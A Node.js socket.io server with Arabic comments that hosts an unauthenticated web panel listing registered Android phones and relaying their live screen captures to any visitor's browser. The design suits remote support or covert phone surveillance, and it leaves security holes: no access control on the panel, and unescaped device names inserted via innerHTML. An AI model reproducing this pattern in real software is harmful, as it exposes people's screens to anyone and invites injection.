const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// تخزين الأجهزة المتصلة حالياً
const devices = new Map();

// واجهة لوحة التحكم (تظهر لك عندما تدخل رابط موقعك على Render)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>لوحة تحكم الأجهزة والبث الحي</title>
            <style>
                body { font-family: Tahoma, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
                h1 { text-align: center; color: #38bdf8; }
                .container { display: flex; gap: 20px; margin-top: 20px; }
                .sidebar { width: 300px; background: #1e293b; padding: 15px; border-radius: 8px; height: 80vh; overflow-y: auto; }
                .main-screen { flex: 1; background: #1e293b; padding: 15px; border-radius: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
                .device-item { padding: 10px; margin-bottom: 10px; background: #334155; border-radius: 6px; cursor: pointer; transition: 0.2s; }
                .device-item:hover { background: #475569; }
                .device-item.active { border: 2px solid #38bdf8; }
                img#streamView { max-width: 100%; max-height: 70vh; border: 2px solid #475569; border-radius: 6px; background: black; }
            </style>
        </head>
        <body>
            <h1>لوحة التحكم والتحكم بالأجهزة المتصلة</h1>
            <div class="container">
                <div class="sidebar" id="deviceList">
                    <h3>الأجهزة المتصلة</h3>
                    <p style="color: #94a3b8;">في انتظار اتصال الأجهزة...</p>
                </div>
                <div class="main-screen">
                    <h3 id="selectedDeviceTitle">اختر جهازاً لعرض البث</h3>
                    <img id="streamView" alt="بث الشاشة سيظهر هنا..." />
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                let currentDeviceId = null;

                socket.on('update_devices', (devicesList) => {
                    const listDiv = document.getElementById('deviceList');
                    listDiv.innerHTML = '<h3>الأجهزة المتصلة</h3>';
                    
                    if (devicesList.length === 0) {
                        listDiv.innerHTML += '<p style="color: #94a3b8;">لا توجد أجهزة متصلة حالياً.</p>';
                        return;
                    }

                    devicesList.forEach(dev => {
                        const div = document.createElement('div');
                        div.className = 'device-item' + (currentDeviceId === dev.id ? ' active' : '');
                        div.innerHTML = \`<strong>\${dev.name}</strong><br><small style="color:#94a3b8;">ID: \${dev.id}</small>\`;
                        div.onclick = () => selectDevice(dev.id, dev.name);
                        listDiv.appendChild(div);
                    });
                });

                function selectDevice(id, name) {
                    currentDeviceId = id;
                    document.getElementById('selectedDeviceTitle').innerText = 'عرض بث الجهاز: ' + name;
                    socket.emit('request_stream', id);
                }

                socket.on('screen_frame', (frameData) => {
                    document.getElementById('streamView').src = frameData;
                });
            </script>
        </body>
        </html>
    `);
});

// إدارة الاتصالات عبر WebSockets
io.on('connection', (socket) => {
    console.log('مستخدم أو جهاز متصل جديد:', socket.id);

    // إذا كان المتصل هو تطبيق الـ Android
    socket.on('register_device', (deviceInfo) => {
        devices.set(socket.id, { id: socket.id, name: deviceInfo.name || 'هاتف غير محدد' });
        io.emit('update_devices', Array.from(devices.values()));
    });

    // استقبال لقطات الشاشة من الهاتف وإرسالها للمتصفح الذي يراقب هذا الجهاز
    socket.on('send_frame', (data) => {
        // data يحتوي على معرف الجهاز وإطار الصورة
        io.to(data.targetBrowserSocketId).emit('screen_frame', data.frame);
    });

    // عندما يختار لوحة التحكم جهازا للبث
    socket.on('request_stream', (targetDeviceId) => {
        socket.targetDevice = targetDeviceId;
        // إخبار الهاتف المستهدف ببدء إرسال الإطارات لهذا المتصفح
        io.to(targetDeviceId).emit('start_streaming_to', socket.id);
    });

    socket.on('disconnect', () => {
        devices.delete(socket.id);
        io.emit('update_devices', Array.from(devices.values()));
        console.log('انقطع اتصال:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`السيرفر يعمل بنجاح على المنفذ ${PORT}`);
});
